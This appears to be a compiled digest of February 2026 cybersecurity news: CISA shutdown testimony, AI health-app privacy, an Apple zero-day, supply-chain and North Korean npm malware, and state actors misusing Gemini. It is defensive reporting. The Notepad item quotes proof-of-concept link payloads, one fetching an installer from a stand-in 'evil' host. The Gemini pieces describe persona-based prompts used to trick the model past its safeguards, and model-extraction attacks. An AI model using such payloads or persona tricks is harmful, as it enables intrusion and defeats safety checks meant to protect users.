[23] Cyberscoop - Acting CISA chief says DHS funding lapse would limit, halt some agency work
────────────────────────────────────────────────────────────────────────────────
Tarih: Wed, 11 Feb 2026 22:04:31 +0000
Link: https://cyberscoop.com/cisa-shutdown-impact-dhs-funding-testimony/

[TAM METİN - 669 kelime]
Another Department of Homeland Security shutdown would hamper the Cybersecurity and Infrastructure Security Agency’s ability to respond to threats, offer services, develop new capabilities and finish writing a key regulation, its acting director told Congress Wednesday.

Some of those activities would continue on a limited basis, while others would halt entirely, acting CISA leader Madhu Gottumukkala testified before the House Appropriations Subcommittee on Homeland Security.

“A lapse in funding would impede CISA’s ability to perform … good work,” he told the panel. “When the government shuts down, our adversaries do not.”

As lawmakers held the hearing, DHS was hurtling toward another potential shutdown as Democrats and Republicans clashed over Trump administration immigration policies and enforcement, with a focus most recently on the massive influx of DHS officers in Minneapolis, where those officers have killed multiple U.S. citizens.

Republicans said at the hearing the testimony should persuade Democrats to fund DHS, since its border operations are largely funded by last year’s budget reconciliation law and a shutdown would mainly harm DHS’s other agencies. Democrats said the hearing was “for show,” as they have put forward proposals to fund the rest of DHS as the immigration debate continues — and as 90% of DHS would continue operating under a shutdown, as the panel’s top Democrat, Henry Cuellar of Texas, asserted.

Gottumukkala said CISA planned to designate 888 of its 2,341 employees as “excepted,” meaning they could continue to work during a shutdown, albeit without pay.

“We will do everything we can to meet our mission during the shutdown,” he said. “Uncertainty and those missed paychecks are a serious hardship.”

CISA has reduced its personnel by a third under the second presidency of Donald Trump.

A shutdown “would delay deploying cybersecurity services and capabilities to federal agencies, leaving significant gaps in security programs,” Gottumukkala said in his written testimony. “CISA’s capacity to provide timely and actionable guidance to help partners defend their networks would be degraded.”

There’s a divide between activities CISA could continue in some capacity versus those they would have to shutter entirely during a funding lapse, he said.

“Limited activities include responding to imminent threats, sharing timely vulnerability and incident information, maintaining our 24/7 operations center, and operating cybersecurity shared services,” Gottumukkala said. “However, CISA would not perform any strategic planning, development of cybersecurity advice and guidance, or development of new technical capabilities.”

There would likely be delays in activities like issuing binding operational directives to federal agencies or completing the already-delayed regulations stemming from the Cyber Incident Reporting for Critical Infrastructure Act (CIRCIA), the latter of which would require critical infrastructure operators to report major cyber incidents to CISA and would be paused during a shutdown, he said.

Gottumukkala’s testimony is the latest before Congress to focus on personnel at CISA. The chairman of the Appropriations subcommittee, Rep. Mark Amodei, R-Nev., chided Gottumukkala for what he said were delays in CISA providing a reorganization plan to the panel.

“We’ve been professional. We’ve been respectful,” Amodei said. “We expect exactly the same thing in return.”

[24] Cyberscoop - Your AI doctor doesn’t have to follow the same privacy rules as your real one

AI apps are making their way into healthcare. It’s not clear that rigorous data security or privacy practices will be part of the package.

OpenAI, Anthropic and Google have all rolled out AI-powered health offerings from over the past year. These products are designed to provide health and wellness advice to individual users or organizations, helping to diagnose their illnesses, examine medical records and perform a host of other health-related functions.

OpenAI says that hundreds of millions of people already use ChatGPT to answer health and wellness questions, and studies have found that large language models can be remarkably proficient at medical diagnostics, with one paper calling their capabilities “superhuman” when compared to a human doctor.

But in addition to traditional cybersecurity concerns around how well these chatbots can protect personal health data, there are a host of questions around what kind of legal protections users would have around the personal medical data they share with these apps. Several health care and legal experts told CyberScoop that these companies are almost certainly not subject to the same legal or regulatory requirements – such as data protection rules under the Health Insurance Portability and Accountability Act (HIPAA) – that compel hospitals and other healthcare facilities to ensure protection of your data.

Sara Geoghegan, senior counsel at the Electronic Privacy Information Center, said offering the same or similar data protections as part of a terms of service agreement is markedly different from interacting with a regulated healthcare entity.

“On a federal level there are no limitations – generally, comprehensively – on non-HIPAA protected information or consumer information being sold to third parties, to data brokers,” she said.

She also pointed to data privacy concerns that stemmed from the bankruptcy and sale of genetic testing company 23andMe last year as a prime example of the dangers consumers face when handing over their sensitive health or biometric data to a unregulated entity.

In many cases, these AI health apps carry the same kind of security and privacy risks as other generative AI products: data leakage, hallucinations, prompt injections and a propensity to give confident but wrong answers.

Additionally, data breaches in the healthcare industry have become increasingly common over the past several years, even before the current AI boom. Healthcare organizations are frequent targets for hacking, phishing, and ransomware, and even though companies can be held legally responsible under HIPAA for failing to protect patient data, breaches still happen because many systems rely on outdated software, depend on numerous outside vendors, and struggle to keep up with the cost and complexity of strong cybersecurity.

Carter Groome, CEO of First Health Advisory, a healthcare and cybersecurity risk management consulting firm, said that beyond concerns over whether these tech companies can even reasonably promise to protect your health data, it’s also not clear their security protections are anything more than a company policy.

“They’re not mandated by HIPAA,” Groome said. “Organizations that are building apps, there’s a real gray area for any sort of compliance” with health care data privacy laws.

Privacy is especially important in health and medicine, both for protecting sensitive medical information and for building trust in the health system overall. That’s why hospitals, doctor’s offices, lab testing facilities and other associated entities have been subject to heightened laws and regulations around protecting patient records and other health data.

Laws like HIPAA require covered entities and their business associates to “maintain reasonable and appropriate administrative, physical, and technical safeguards for the security of certain individually identifiable health information.”

It also subjects companies to breach notification rules that force them to notify victims, the Department of Health and Human Services and in some cases the public when certain health data has been accessed, acquired, used or disclosed in a data breach.

Groome and Andrew Crawford, senior counsel at Center for Democracy and Technology’s Data and Privacy Project, said that tech companies like OpenAI, Anthropic and Google almost certainly would not be considered covered entities under HIPAA’s security rule, which according to HHS applies to health plans, clearinghouses, health care providers and business associates who transfer Electronic Protected Health Information (ePHI).

OpenAI and Anthropic do not claim that ChatGPT Health or Claude for Healthcare follow HIPAA. Anthropic’s web site describes Claude for Healthcare as “built on HIPAA-ready infrastructure,” while OpenAI’s page for its suite of healthcare-related enterprise products claims they “support” HIPAA compliance.OpenAI, Anthropic and Google did not respond to a request for comment from CyberScoop.

That distinction means “that a number of companies not bound by HIPAA’s privacy protections will be collecting, sharing, and using peoples’ health data,” Crawford said in a statement to CyberScoop. “And since it’s up to each company to set the rules for how health data is collected, used, shared, and stored, inadequate data protections and policies can put sensitive health information in real danger.”

Laws like HIPAA contain strong privacy protections for health data but are limited in scope and “meant to help the digitization of records, not stop tech companies from gathering your health data outside of the doctor’s office,” Geoghegan said.

As they expand into healthcare, tech companies like OpenAI, Anthropic, and Google have emphasized data security as a top priority in their product launches.

OpenAI said their health model uses an added layer of built encryption and isolation features to compartmentalize health conversations, as well as added features like multifactor authentication. And, like other OpenAI models, ChatGPT Health encrypts its data at rest and in transit, has a feature to delete chats within 30 days and promises your data won’t be used for AI training.

For uploading medical records, OpenAI said it is partnering with b.well, an AI-powered digital health platform that connects health data for U.S. patients. On its website, the company says “it uses a transparent, consumer-friendly privacy policy that lets users control and change data-sharing permissions at any time, does not sell personal data, and only shares it without permission in limited cases. It also voluntarily follows the CARIN Alliance Trust Framework and Code of Conduct—making it accountable to the FTC—and says it aims to meet or exceed HIPAA standards through measures like encryption, regular security reviews, and HITRUST and NIST CSF certifications, though it notes no system can fully eliminate cyber risk.

Legal experts say that when tech companies promise their AI products are “HIPAA compliant” or “HIPAA ready,” it’s often unclear whether these claims amount to anything more than a promise not to use health data irresponsibly.

These distinctions matter when it comes to personal health data. Geoghegan said it is not uncommon in some corners of the wellness industry for an unregulated business to ambiguously claim they are “HIPAA-compliant” to elude the fact that they aren’t legally bound by the regulations.

“Generally speaking, a lot of companies say they’re HIPAA compliant, but what they mean is that they’re not a HIPAA regulated entity, therefore they have no obligation,” said Geoghegan.

Groome suggested that AI companies are being “hyperbolic” in their commitment to security in an effort to assuage the concerns of privacy critics, noting that their product announcements contain “a comical level of how much they say they’re going to protect your information.”

An added wrinkle is that AI tools remain black boxes in some respects, with even their developers unable to fully understand or explain how they work. That kind of uncertainty, especially with healthcare data, can lead to bad security or privacy outcomes.

“It’s really shaky right now when a company comes out and says ‘we’re fully HIPAA compliant’ and I think what they’re doing is trying to give the consumer a false sense of trust,” said Groome.

Several sources told CyberScoop that despite these risks, they expect AI health apps to continue being widely used, in part because the traditional American healthcare system remains so expensive.

AI tools – by contrast – are convenient, immediate and cost effective. While people like Geoghegan and Groome have said they are sympathetic to the pressures that push people towards these apps, the tradeoffs are troubling.

“A lot of this stems from the fact that care is inaccessible, it’s hard to get and it’s expensive, and there are many reasons why people don’t trust in health care provisions,” said Geoghegan. “But the solution to that care being inaccessible cannot be relying on big tech and billionaire’s products. We just can’t trust [them] to have our best health interest in mind.”

Apple patches decade-old iOS zero-day, possibly exploited by commercial spyware

Flaw abused 'in an extremely sophisticated attack against specific targeted individuals'

Apple patched a zero-day vulnerability affecting every iOS version since 1.0, used in what the company calls an "extremely sophisticated attack" against targeted individuals.

CVE-2026-20700, discovered by Google's Threat Analysis Group, affects dyld - Apple's dynamic linker - and allows attackers with memory write capability to execute arbitrary code. Apple said the flaw was exploited in the wild and may have been part of an exploit chain.

Its advisory stated: "An attacker with memory write capability may be able to execute arbitrary code. Apple is aware of a report that this issue may have been exploited in an extremely sophisticated attack against specific targeted individuals on versions of iOS before iOS 26."

Google's researchers also referenced two December vulnerabilities in their report that both carry 8.8 CVSS scores.

CVE-2025-14174 is an out-of-bounds memory access flaw in Google Chrome's ANGLE graphics engine on Mac that could be exploited through a malicious webpage.

The other, CVE-2025-43529, is a use-after-free leading to code execution.

Brian Milbier, deputy CISO at Huntress, said: "Think of dyld as the doorman for your phone. Every single app that wants to run must first pass through this doorman to be assembled and given permission to start.

"Usually, the doorman checks credentials and places apps in a high-security 'sandbox' where they can't touch your private data. This vulnerability allows an attacker to trick the doorman into handing over a master key before security checks even begin."

Apple, Google forced to issue emergency 0-day patches

Two Android 0-day bugs disclosed and fixed, plus 105 more to patch

By chaining this with WebKit flaws Apple also addressed in the iOS 26.3 update, "attackers have created a 'zero-click' or 'one-click' path to total control. They use a fake ID to bypass the front gate – your browser – and then exploit the doorman's flaw to take over the entire building," Milbier added.

"This level of sophistication resembles other exploits developed by the commercial surveillance industry. These are private companies that also developed prominent spyware tools like Pegasus and Predator. They sell these types of exploits or tools to government clients. While some updates in this patch address minor issues, such as data leakage from physical access, the dyld/WebKit chain is in a different league. iOS 26.3 closes a door that has been unlocked for over a decade."

Apple's updates for iOS and iPadOS also feature a host of other fixes for various bugs, including flaws that grant root access and disclose sensitive user information, but CVE-2026-20700 is the only one it said was exploited in the wild. ®

[26] The Register - Supply chain attacks now fuel a 'self-reinforcing' cybercrime economy

Supply chain attacks now fuel a 'self-reinforcing' cybercrime economy

Researchers say breaches link identity abuse, SaaS compromise, and ransomware into a cascading cycle

Cybercriminals are turning supply chain attacks into an industrial-scale operation, linking breaches, credential theft, and ransomware into a "self-reinforcing" ecosystem, researchers say.

In its latest trends report, Group-IB reckons individual strikes that lead to broader downstream compromises of businesses are now interconnected as cyberbaddies pursue multiple methods to breach vendors and service providers.

Supply chain hacks like the recent Shai-Hulud NPM worm, Salesloft debacle, or the OpenClaw package poisoning are fast becoming the primary goals of the criminal fraternity who try to exploit the inherited access to a victim's customers.

"Open source package compromise feeds malware distribution and credential theft," the research states. "Phishing and OAuth abuse enable identity compromise that unlocks SaaS and CI/CD environments. Data breaches supply the credentials, context, and relationships needed to refine impersonation and lateral movement. Ransomware and extortion arrive later in the chain, capitalizing on access and intelligence gathered earlier. Each stage strengthens the next, creating a self-reinforcing cycle of supply chain exploitation."

Over the next year, GroupIB predicts supply chain attacks will be executed faster thanks to AI-assisted tools that can scan for vulnerabilities across vendors, CI/CD pipelines, and browser extension marketplaces at machine speed.

It also expects to see traditional malware replaced by identity attacks, whereby criminals set themselves up as genuine users and their activity blends into the normal daily business functions, evading detection for longer periods.

Platforms offering HR, CRM, and ERP, as well as MSPs, are high-priority targets, Group-IB says, as a single compromise can lead to hackers gaining access to hundreds of customers.

Evolution of data breaches

The Salesloft breach, as well as the Oracle compromise of March 2025, are examples of how data breaches are shifting from a single-reward model to one where access is used for additional compromises.

Instead of taking one big wedge of data and demanding an extortion payment, criminals took their time to collect OAuth tokens and exploit misconfigured partner connections to move laterally. They then target downstream customers, steal their data and contact lists to repeat the cycle, or, in cases involving NPM and similar ecosystems, serve malicious updates to users to carry out fraud at scale.

"Cybercrime is no longer defined by single breaches. It is defined by cascading failures of trust," said Dmitry Volkov, Group-IB CEO.

"Attackers are industrializing supply chain compromise because it delivers scale, speed, and stealth. A single upstream breach can now ripple across entire industries. Defenders must stop thinking in terms of isolated systems and start securing trust itself, across every relationship, identity, and dependency."

Organizations should treat third parties as extensions of their own attack surface.

"Strategic investments in supply chain threat modeling, automated dependency checks, and data flow visibility are no longer optional – they are foundational to modern security architecture," said Volkov. ®

[27] The Register - Google: China's APT31 used Gemini to plan cyberattacks against US orgs

Google: China's APT31 used Gemini to plan cyberattacks against US orgs

Meanwhile, IP-stealing 'distillation attacks' on the rise

A Chinese government hacking group that has been sanctioned for targeting America's critical infrastructure used Google's AI chatbot, Gemini, to auto-analyze vulnerabilities and plan cyberattacks against US organizations, the company says.

While there's no indication that any of these attacks were successful, "APT groups like this continue to experiment with adopting AI to support semi-autonomous offensive operations," Google Threat Intelligence Group chief analyst John Hultquist told The Register. "We anticipate that China-based actors in particular will continue to build agentic approaches for cyber offensive scale."

In the threat-intel group's most recent AI Threat Tracker report, released on Thursday and shared with The Register in advance, Google attributes this activity to APT31, a Beijing-backed crew also known as Violet Typhoon, Zirconium, and Judgment Panda.

This goon squad was one of many exploiting a series of Microsoft SharePoint bugs over the summer, and in March 2024, the US issued sanctions against and criminally charged seven APT31 members accused of breaking into computer networks, email accounts, and cloud storage belonging to numerous high-value targets.

The most recent attempts by APT31 to use Google's Gemini AI tool happened late last year, we're told.

"APT31 employed a highly structured approach by prompting Gemini with an expert cybersecurity persona to automate the analysis of vulnerabilities and generate targeted testing plans," according to the report.

The adversaries' adoption of this capability is so significant – it's the next shoe to drop

In one case, the China-based gang used Hexstrike, an open source, red-teaming tool built on the Model Context Protocol (MCP) to analyze various exploits - including remote code execution, web application firewall (WAF) bypass techniques, and SQL injection - "against specific US-based targets," the Googlers wrote.

Hexstrike enables models, including Gemini, to execute more than 150 security tools with a slew of capabilities, including network and vulnerability scanning, reconnaissance, and penetration testing. Its intended use is to help ethical hackers and bug hunters find security weaknesses and collect bug bounties – but shortly after its release in mid-August, criminals began using the AI platform for more nefarious purposes.

Moving closer to automated attacks

Integrating Hexstrike with Gemini "automated intelligence gathering to identify technological vulnerabilities and organizational defense weaknesses," the AI threat tracker says, noting that Google has since disabled accounts linked to this campaign. "This activity explicitly blurs the line between a routine security assessment query and a targeted malicious reconnaissance operation."

Google's report, which picks up where its November 2025 analysis left off, details how government-backed groups and cybercriminals alike are abusing Google's AI tools, along with the steps the Chocolate Factory has implemented to stop them. And it finds that attackers - just like everybody else on the planet - have a keen interest in agentic AI's capabilities to make their lives and jobs easier.

"The adversaries' adoption of this capability is so significant - it's the next shoe to drop," Hultquist said.

He explained there are two areas that Google is most concerned about.

"One is the ability to operate across the intrusion," he said, noting the earlier Anthropic report about Chinese cyberspies abusing its Claude Code AI tool to automate most elements of attacks directed at high-profile companies and government organizations. In "a small number of cases," they even succeeded.

"The other is automating the development of vulnerability exploitation," Hultquist said. "These are two ways where adversaries can get major advantages and move through the intrusion cycle with minimal human interference. That allows them to move faster than defenders and hit a lot of targets."

In addition, using AI agents to find vulnerabilities and test exploits widens the patch gap - the time between the bug becoming known and a full working fix being deployed and implemented.

"It's a really significant space currently," Hultquist said. "In some organizations, it takes weeks to put defenses in place."

This requires security professionals to think differently about defense, using AI to respond and fix security weaknesses more quickly than humans can on their own.

Crims claim HexStrike AI penetration tool makes quick work of Citrix bugs

AI agents can't yet pull off fully autonomous cyberattacks – but they are already very helpful to crims

Agents gone wild! Companies give untrustworthy bots keys to the kingdom

"We are going to have to leverage the advantages of AI, and increasingly remove humans from the loop, so that we can respond at machine speed," Hultquist noted.

The latest report also found an increase in model extraction attempts - what it calls "distillation attacks" - and says both GTIG and Google DeepMind identified miscreants attempting to perform model extraction on Google's AI products. This is a type of intellectual property theft used to gain insights into a model's underlying reasoning and chain-of-thought processes.

"This is coming from threat actors throughout the globe," Hultquist said. "Your model is really valuable IP, and if you can distill the logic behind it, there's very real potential that you can replicate that technology – which is not inexpensive."

This essentially gives criminals and shady companies the ability to accelerate AI model development at a much lower cost, and Google's report cites "model stealing and capability extraction emanating from researchers and private sector companies globally." ®

[1] The Hacker News - Google Reports State-Backed Hackers Using Gemini AI for Recon and Attack Support
────────────────────────────────────────────────────────────────────────────────

[TAM METİN - 1069 kelime]
Google on Thursday said it observed the North Korea-linked threat actor known as UNC2970 using its generative artificial intelligence (AI) model Gemini to conduct reconnaissance on its targets, as various hacking groups continue to weaponize the tool for accelerating various phases of the cyber attack life cycle, enabling information operations, and even conducting model extraction attacks.

"The group used Gemini to synthesize OSINT and profile high-value targets to support campaign planning and reconnaissance," Google Threat Intelligence Group (GTIG) said in a report shared with The Hacker News. "This actor's target profiling included searching for information on major cybersecurity and defense companies and mapping specific technical job roles and salary information."

The tech giant's threat intelligence team characterized this activity as a blurring of boundaries between what constitutes routine professional research and malicious reconnaissance, allowing the state-backed actor to craft tailored phishing personas and identify soft targets for initial compromise.

UNC2970 is the moniker assigned to a North Korean hacking group that overlaps with a cluster that's tracked as Lazarus Group, Diamond Sleet, and Hidden Cobra. It's best known for orchestrating a long-running campaign codenamed Operation Dream Job to target aerospace, defense, and energy sectors with malware under the guise of approaching victims under the pretext of job openings.

GTIG said UNC2970 has "consistently" focused on defense targeting and impersonating corporate recruiters in their campaigns, with the target profiling including searches for "information on major cybersecurity and defense companies and mapping specific technical job roles and salary information."

UNC2970 is far from the only threat actor to have misused Gemini to augment their capabilities and move from initial reconnaissance to active targeting at a faster clip. Some of the other hacking crews that have integrated the tool into their workflows are as follows -

UNC6418 (Unattributed), to conduct targeted intelligence gathering, specifically seeking out sensitive account credentials and email addresses.

Temp.HEX or Mustang Panda (China), to compile a dossier on specific individuals, including targets in Pakistan, and to gather operational and structural data on separatist organizations in various countries.

APT31 or Judgement Panda (China), to automate the analysis of vulnerabilities and generate targeted testing plans by claiming to be a security researcher.

APT41 (China), to extract explanations from open-source tool README.md pages, as well as troubleshoot and debug exploit code.

UNC795 (China), to troubleshoot their code, conduct research, and develop web shells and scanners for PHP web servers.

APT42 (Iran), to facilitate reconnaissance and targeted social engineering by crafting personas that induce engagement from the targets, as well as develop a Python-based Google Maps scraper, develop a SIM card management system in Rust, and research the use of a proof-of-concept (PoC) for a WinRAR flaw (CVE-2025-8088).

One recurring avenue for abuse of generative AI models like Gemini occurs when threat actors reframe their prompts by identifying themselves as a security researcher or a participant in a capture-the-flag (CTF) exercise to trick the system into generating unexpected responses. Steve Miller, AI threat lead at GTIG, told The Hacker News that the company is constantly improving its safety mechanisms to combat such scenarios.

"Google is always working to improve our safety systems, including detection classifiers, mitigations and other safeguards to prevent misuse by threat actors," Miller said. "As adversaries experience friction in misusing our systems, they begin to experiment with new ways to bypass the safeguards – and though we see lots of these experiments, they are not always successful. Gemini is getting better at recognizing persona-based tricks and responding safely. As we observe new threat activity, we work to strengthen those guard rails."

Google also said it detected a malware called HONESTCUE that leverages Gemini's API to outsource functionality generation for the next-stage, along with an AI-generated phishing kit codenamed COINBAIT that's built using Lovable AI and masquerades as a cryptocurrency exchange for credential harvesting. Some aspects of COINBAIT-related activity have been attributed to a financially motivated threat cluster dubbed UNC5356.

"HONESTCUE is a downloader and launcher framework that sends a prompt via Google Gemini's API and receives C# source code as the response," it said. "However, rather than leveraging an LLM to update itself, HONESTCUE calls the Gemini API to generate code that operates the 'stage two' functionality, which downloads and executes another piece of malware."

The fileless secondary stage of HONESTCUE then takes the generated C# source code received from the Gemini API and uses the legitimate .NET CSharpCodeProvider framework to compile and execute the payload directly in memory, thereby leaving no artifacts on disk.

Google has also called attention to a recent wave of ClickFix campaigns that leverage the public sharing feature of generative AI services to host realistic-looking instructions to fix a common computer issue and ultimately deliver information-stealing malware. The activity was flagged in December 2025 by Huntress.

Lastly, the company said it identified and disrupted model extraction attacks that are aimed at systematically querying a proprietary machine learning model to extract information and build a substitute model that mirrors the target's behavior. In a large-scale attack of this kind, Gemini was targeted by over 100,000 prompts that posed a series of questions aimed at replicating the model's reasoning ability across a broad range of tasks in non-English languages.

Last month, Praetorian devised a PoC extraction attack where a replica model achieved an accuracy rate of 80.1% simply by sending a series of 1,000 queries to the victim's API and recording the outputs and training it for 20 epochs.

"Many organizations assume that keeping model weights private is sufficient protection," security researcher Farida Shafik said. "But this creates a false sense of security. In reality, behavior is the model. Every query-response pair is a training example for a replica. The model’s behavior is exposed through every API response."

Google, which launched the AI Cyber Defense Initiative in 2024, has noted that AI offers the best opportunity to reverse the Defender's Dilemma and tilt the cybersecurity scales in favor of defenders.

"Everyone is looking to increase productivity with automation. Adversaries are increasingly seeing value from AI," Miller said. "They are using AI routinely and they are building capabilities with it, so it is easy to predict that we will see an increase in the quality, quantity and speed of AI-enabled attacks. Defenders need to prepare for the future and make similar investments in AI, and build towards AI-enabled defensive capabilities that can operate at machine speed."

(The story was updated after publication to include responses from GTIG.)

[2] The Hacker News - Lazarus Campaign Plants Malicious Packages in npm and PyPI Ecosystems
────────────────────────────────────────────────────────────────────────────────
Tarih: Thu, 12 Feb 2026 22:25:00 +0530

[TAM METİN - 827 kelime]
Cybersecurity researchers have discovered a fresh set of malicious packages across npm and the Python Package Index (PyPI) repository linked to a fake recruitment-themed campaign orchestrated by the North Korea-linked Lazarus Group.

The coordinated campaign has been codenamed graphalgo in reference to the first package published in the npm registry. It's assessed to be active since May 2025.

"Developers are approached via social platforms like LinkedIn and Facebook, or through job offerings on forums like Reddit," ReversingLabs researcher Karlo Zanki said in a report. "The campaign includes a well-orchestrated story around a company involved in blockchain and cryptocurrency exchanges."

Notably, one of the identified npm packages, bigmathutils, attracted more than 10,000 downloads after the first, non-malicious version was published, and before the second version containing a malicious payload was released. The names of the packages are listed below -

As with many job-focused campaigns conducted by North Korean threat actors, the attack chain begins with establishing a fake company like Veltrix Capital in the blockchain and cryptocurrency trading space, and then setting up the necessary digital real estate to create an illusion of legitimacy.

This includes registering a domain and creating a related GitHub organization to host several repositories for use in coding assessments. The repositories have been found to contain projects based on Python and JavaScript.

"Examination of these repositories didn't reveal any obvious malicious functionality," Zanki said. "That is because the malicious functionality was not introduced directly via the job interview repositories, but indirectly – through dependencies hosted on the npm and PyPI open-source package repositories."

The idea behind setting up these repositories is to trick candidates who apply to its job listings on Reddit and Facebook Groups into running the projects on their machines, effectively installing the malicious dependency and triggering the infection. In some cases, victims are directly contacted by seemingly legitimate recruiters on LinkedIn.

The packages ultimately act as a conduit to deploy a remote access trojan (RAT) that periodically fetches and executes commands from an external server. It supports various commands to gather system information, enumerate files and directories, list running processes, create folders, rename files, delete files, and upload/download files.

Interestingly, the command-and-control (C2) communication is protected by a token-based mechanism to ensure that only requests with a valid token are accepted. The approach was previously observed in 2023 campaigns linked to a North Korean hacking group called Jade Sleet, which is also known as TraderTraitor or UNC4899.

It essentially works like this: the packages send system data as part of a registration step to the C2 server, which responds with a token. This token is then sent back to the C2 server in subsequent requests to establish that they are originating from an already registered infected system.

"The token-based approach is a similarity [...] in both cases and has not been used by other actors in malware hosted on public package repositories as far as we know," Zanki told The Hacker News at that time.

The findings show that North Korean state-sponsored threat actors continue to poison open-source ecosystems with malicious packages in hopes of stealing sensitive data and conducting financial theft, a fact evidenced by the RAT's checks to determine if the MetaMask browser extension is installed in the machine.

"Evidence suggests that this is a highly sophisticated campaign," ReversingLabs said. "Its modularity, long-lived nature, patience in building trust across different campaign elements, and the complexity of the multilayered and encrypted malware point to the work of a state-sponsored threat actor."

More Malicious npm Packages Found

The disclosure comes as JFrog uncovered a sophisticated, malicious npm package called "duer-js" published by a user named "luizaearlyx." While the library claims to be a utility to "make the console window more visible," it harbors a Windows information stealer called Bada Stealer.

"In addition to stealing information from the host it infected, the malicious package downloads a secondary payload," security researcher Guy Korolevski said. "This payload is designed to run on the Discord Desktop app startup, with self-updating capabilities, stealing directly from it, including payment methods used by the user."

It also coincides with the discovery of another malware campaign that weaponizes npm to extort cryptocurrency payments from developers during package installation using the "npm install" command. The campaign, first recorded on February 4, 2026, has been dubbed XPACK ATTACK by OpenSourceMalware.

The names of the packages, all uploaded by a user named "dev.chandra_bose," are listed below -

xpack-video-submission

xpack-subscription-test

testing-package-xdsfdsfsc

"Unlike traditional malware that steals credentials or executes reverse shells, this attack innovatively abuses the HTTP 402 'Payment Required' status code to create a seemingly legitimate payment wall," security researcher Paul McCarty said. "The attack blocks installation until victims pay 0.1 USDC/ETH to the attacker's wallet, while collecting GitHub usernames and device fingerprints."

"If they refuse to pay, the installation simply fails after wasting 5+ minutes of their development time, and they may not even realize they've encountered malware versus what appeared to be a legitimate paywall for package access."

[TAM METİN - 8671 kelime]
Threat activity this week shows one consistent signal — attackers are leaning harder on what already works. Instead of flashy new exploits, many operations are built around quiet misuse of trusted tools, familiar workflows, and overlooked exposures that sit in plain sight.

Another shift is how access is gained versus how it’s used. Initial entry points are getting simpler, while post-compromise activity is becoming more deliberate, structured, and persistent. The objective is less about disruption and more about staying embedded long enough to extract value.

There’s also growing overlap between cybercrime, espionage tradecraft, and opportunistic intrusion. Techniques are bleeding across groups, making attribution harder and defense baselines less reliable.

Below is this week’s ThreatsDay Bulletin — a tight scan of the signals that matter, distilled into quick reads. Each item adds context to where threat pressure is building next.

Notepad RCE via Markdown Links

Microsoft Patches Notepad Flaw


      Microsoft has patched a command injection flaw (CVE-2026-20841, CVSS score: 8.8) in its Notepad app that could result in remote code execution. "Improper neutralization of special elements used in a command ('command injection') in Windows Notepad App allows an unauthorized attacker to execute code over a network," Microsoft said. An attacker could exploit this flaw by tricking a user into clicking a malicious link inside a Markdown file opened in Notepad, causing the application to run remote files. "The malicious code would execute in the security context of the user who opened the Markdown file, giving the attacker the same permissions as that user," the tech giant added. Proof-of-concept (PoC) exploits show that the vulnerability can be triggered by creating a Markdown file with "file://" links that point to executable files ("file://C:/windows/system32/cmd.exe") or contain special URIs ("ms-appinstaller://?source=https://evil/xxx.appx") to run arbitrary payloads. The issue was fixed as part of its monthly Patch Tuesday update this week. Microsoft added Markdown support to Notepad on Windows 11 last May.

APT Pressure Intensifies on Taiwan

Taiwan Becomes Target of APT Attacks


      TeamT5 said tracked more than 510 advanced persistent threat (APT) operations affecting 67 countries globally in 2025, out of which 173 attacks targeted Taiwan. "Taiwan’s role in geopolitical tensions and values in the global technology supply chain makes it uniquely vulnerable for adversaries who seek intelligence or long-term access to achieve political and military objectives," the security vendor said. "Taiwan is more than just a target – it functions as a proving ground where China-nexus APTs test and refine their tactics before scaling them to other environments."

Node.js Stealer Hits Windows

LTX Stealer Targets Windows Systems


      A new Node.js information stealer named LTX Stealer has been spotted in the wild. Targeting Windows systems and distributed via a heavily obfuscated Inno Setup installer, the malware conducts large-scale credential harvesting from Chromium-based browsers, targets cryptocurrency-related artifacts, and stages the collected data for exfiltration. "The campaign relies on a cloud-backed management infrastructure, where Supabase is used exclusively as the authentication and access-control layer for the operator panel, while Cloudflare is leveraged to front backend services and mask infrastructure details," CYFIRMA said.

Marco Stealer Expands Data Theft

Marco Stealer Emerges in the Wild


      Another new Windows-oriented information stealer is Marco Stealer, which was first observed in June 2025. Delivered via a downloader in a ZIP archive, it mainly targets browser data, cryptocurrency wallet information, files from popular cloud services like Dropbox and Google Drive, and other sensitive files stored on the victim's system. "Marco Stealer relies on encrypted strings that are decrypted only at runtime to avoid static analysis. In addition, the information stealer uses Windows APIs to detect anti-analysis tools like Wireshark, x64dbg, and Process Hacker," Zscaler ThreatLabz said. "Stolen data is encrypted using AES-256 before being sent to C2 servers via HTTP POST requests."

Telegram Sessions Hijacked via OAuth Abuse

Social Engineering Campaign Targets Telegram Accounts


      A new account takeover campaign has been observed abusing Telegram's native authentication workflows to obtain fully authorized user sessions. In one variant, victims are prompted to scan a QR code on bogus sites using the Telegram mobile application, initiating a legitimate Telegram login attempt tied to attacker-controlled API credentials. Telegram then sends an in-app authorization prompt to the victim's existing session. Alternatively, users can also enter their country code, phone number, and verification code (if enabled) on a fake web page, which causes the data to be relayed to Telegram's official authentication APIs. Upon successful verification, Telegram issues an in-app authorization request as before. "Unlike traditional phishing attacks that rely solely on credential harvesting or token replay, this campaign leverages attacker-controlled Telegram API credentials and integrates directly with Telegram's legitimate login and authorization infrastructure," CYFIRMA noted. "By inducing victims to approve in-app authorization prompts under false pretenses, the attackers achieve complete session compromise while minimizing technical anomalies and user suspicion."

Discord Expands Global Age Checks

Discord Announces Age Verification Plans


      Discord has announced it will require all users globally to verify their ages by sharing video selfies or providing government IDs to access certain content. Additionally, it will implement an age inference model, a new system that runs in the background to help determine whether an account belongs to an adult, without always requiring users to verify their age. The company has assured that video selfies don't leave a user's device, that identity documents submitted to third-party vendors, in this case k-ID, are "deleted quickly" or "immediately" after age confirmation, and that a user's age verification status cannot be seen by other users. However, concerns have been raised about whether Discord can be trusted with their most sensitive information, especially in the aftermath of a security breach of a third-party service that Discord previously relied on to verify ages in the U.K. and Australia. The incident led to the theft of government IDs of 70,000 Discord users. In a statement given to Ars Technica, k-ID said the age estimation technology runs entirely on device and no third-parties store personal data shared during age checks. The move comes at a time when laws requiring age verification on social media platforms are being adopted across the world. Discord confirmed that "a phased global rollout" would begin in "early March," at which point all users globally would be defaulted to “teen-appropriate" experiences.

GuLoader Refines Evasion Tradecraft

GuLoader Continues to Evolve


      A new analysis of the GuLoader malware has revealed that it employs polymorphic code to dynamically construct constants during execution and exception-based control flow obfuscation to conceal its functionality and evade detection. Besides introducing sophisticated exception-handling mechanisms to complicate analysis, the malware attempts to bypass reputation-based rules by hosting payloads on trusted cloud services such as Google Drive and OneDrive. First observed in December 2019, GuLoader serves primarily as a downloader for Remote Access Trojans (RATs) and information stealers.

$73.6M Pig-Butchering Scam Sentence

Man Sentenced to 20 Years in Prison for Crypto Scam


